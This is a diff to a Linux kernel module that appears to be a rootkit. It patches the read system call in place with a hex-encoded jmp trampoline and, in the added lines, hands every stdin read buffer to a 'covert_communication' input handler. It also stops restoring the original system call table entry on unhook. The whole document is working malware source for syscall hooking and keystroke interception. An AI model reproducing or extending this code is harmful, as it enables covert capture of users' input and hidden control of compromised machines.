@@ -3,16 +3,23 @@
 #include "hook_read.h"
 #include <linux/unistd.h>
 
+#include "covert_communication.h"
+
 typedef asmlinkage ssize_t (*fun_ssize_t_int_pvoid_size_t)(unsigned int, char __user *, size_t);
 static fun_ssize_t_int_pvoid_size_t original_read;
 
 #define SYSCALL_NR __NR_read
 
-static char syscall_code[7];
-static char new_syscall_code[7] =
-  "\xbd\x00\x00\x00\x00"  /*      movl   $0,%ebp  */
-  "\xff\xe5"              /*      jmp    *%ebp    */
+#define SYSCALL_CODE_LENGTH 5
+
+static char syscall_code[SYSCALL_CODE_LENGTH];
+static char new_syscall_code[SYSCALL_CODE_LENGTH] =
+  "\xe9\x00\x00\x00\x00"  /*      jmp   $0  */
 ;
+// static char new_syscall_code[7] =
+//   "\xbd\x00\x00\x00\x00"  /*      movl   $0,%ebp  */
+//   "\xff\xe5"              /*      jmp    *%ebp    */
+// ;
 
 #define NUM_BYTES_FOR_HOOKED_READ 40
 
@@ -41,20 +48,30 @@ void *_memcpy(void *dest, const void *src, int size){
 asmlinkage ssize_t new_syscall(unsigned int fd, char __user *buf, size_t count){
     void** sys_call_table = (void *) ptr_sys_call_table;
     ssize_t retval;
+    OUR_TRY_MODULE_GET;
     printk(KERN_INFO "Hooked Read System Call - yeha\n");
     _memcpy(
             sys_call_table[SYSCALL_NR], syscall_code,
             sizeof(syscall_code)
            );
-    printk(KERN_INFO "Now calling the original function, you sucker!\n");
+    //printk(KERN_INFO "Now calling the original function, you sucker!\n");
+
     retval = ((asmlinkage ssize_t (*)(unsigned int, char __user*, size_t))sys_call_table[SYSCALL_NR])(fd, buf, count);
-    // retval = original_read(fd, buf, count);
-    printk(KERN_INFO "Yeah! I called it successfully (result was %d)!\n", retval);
+
+    if (retval > 0 && fd == 0){ // only handle this when we actually read something and only read from stdin (fd==0)
+        printk(KERN_INFO "callbackfunction for read!\n");
+        handle_input(buf, retval);
+        //printk(KERN_INFO "%d = hooked_read(%d, %s, %d)\n", retval, fd, buf, count);
+    }
+
+    //printk(KERN_INFO "Yeah! I called it successfully (result was %d)!\n", retval);
     _memcpy(
             sys_call_table[SYSCALL_NR], new_syscall_code,
             sizeof(syscall_code)
            );
-    printk(KERN_INFO "So, I managed to get to return!\n");
+    //printk(KERN_INFO "So, I managed to get to return!\n");
+
+    OUR_MODULE_PUT;
     return retval;
 }
 
@@ -111,7 +128,7 @@ void hook_read(fun_void_charp_int cb){
         callback_function = cb;
     }
 
-    *(int *)&new_syscall_code[1] = (int)new_syscall;
+    *(int *)&new_syscall_code[1] = ((int)new_syscall) - ((int)sys_call_table[SYSCALL_NR] + 5);
     _memcpy(
             syscall_code, sys_call_table[SYSCALL_NR],
             sizeof(syscall_code)
@@ -132,18 +149,15 @@ void hook_read(fun_void_charp_int cb){
 /* Hooks the read system call. */
 void unhook_read(void){
     void** sys_call_table = (void*) ptr_sys_call_table;
-    OUR_DEBUG("Unhooking read...\n");
+    //OUR_DEBUG("Unhooking read...\n");
     callback_function = dummy_callback;
 
-    _memcpy(
-            sys_call_table[SYSCALL_NR], syscall_code,
-            sizeof(syscall_code)
-           );
+    _memcpy( sys_call_table[SYSCALL_NR], syscall_code, sizeof(syscall_code));
 
     //restore_original_read();
 
     // sys_call_table = (void *) ptr_sys_call_table;
     // make_page_writable((long unsigned int) ptr_sys_call_table);
-    sys_call_table[__NR_read] = (void*) original_read;
+    // sys_call_table[__NR_read] = (void*) original_read;
     // make_page_readonly((long unsigned int) ptr_sys_call_table);
 }
